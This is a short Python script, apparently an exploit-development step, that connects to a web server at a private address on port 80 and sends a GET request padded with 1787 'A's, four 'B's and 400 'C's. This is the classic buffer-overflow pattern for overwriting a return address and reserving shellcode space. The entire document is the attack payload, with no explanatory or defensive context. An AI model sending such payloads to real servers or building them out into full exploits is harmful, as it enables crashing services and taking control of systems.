import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('192.168.1.56',80))
metodo_http = "GET "
buff = "A"*1787 + "B"*4 + "C"*400
cabecera_http=" HTTP/1.1\r\n\r\n"
buff_final = metodo_http+buff+cabecera_http
sock.send(buff_final)
sock.recv(1024)
sock.close()
